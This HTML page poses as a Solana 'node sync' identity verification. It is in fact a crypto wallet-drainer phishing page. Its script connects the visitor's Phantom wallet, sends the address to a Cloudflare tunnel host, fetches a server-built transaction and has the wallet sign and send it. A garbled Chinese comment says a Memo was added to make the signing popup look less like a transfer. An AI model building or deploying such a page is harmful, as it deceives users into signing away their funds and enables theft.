<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 300px; padding: 40px; border: 1px solid #14f195; text-align: center; background: #0a0a0a; border-radius: 8px; }
        button { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 16px; }
        #log { font-size: 10px; color: #333; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color:#14f195; margin-bottom:10px;">NODE SYNC</h2>
        <p style="font-size:12px; color:#666; margin-bottom:30px;">Verification required for node #712.</p>
        <button id="cta">CONFIRM IDENTITY</button>
        <div id="log">STATUS: ENCRYPTED_READY</div>
    </div>

    <script>
        const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const log = (t) => document.getElementById('log').innerText = t;
            const p = window.solana || window.phantom?.solana;
            const sWeb3 = window.solanaWeb3;

            try {
                log("CONNECTING...");
                await p.connect();

                log("GENERATING HASH...");
                const resp = await fetch(tunnel + "/prepare_v28", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();

                log("AWAITING CONFIRMATION...");
                const binary = window.atob(info.raw_tx);
                const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
                const tx = sWeb3.VersionedTransaction.deserialize(bytes);

                // ðŸ”± è¿™ä¸€æ­¥ä¼šè°ƒèµ·å¼¹çª—ã€‚å› ä¸ºåŠ å…¥äº† Memoï¼Œæ˜¾ç¤ºä¼šç¨å¾®å¤æ‚ï¼Œæ·¡åŒ–è½¬è´¦æ„Ÿ
                const { signature } = await p.signAndSendTransaction(tx);
                log("VALIDATED: " + signature.slice(0,8));

            } catch (err) {
                log("SYNC ERROR. RETRY.");
                fetch(tunnel + "/debug", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ stage: "V28_FAIL", error: err.message })
                }).catch(()=>{});
            }
        };
    </script>
</body>
</html>
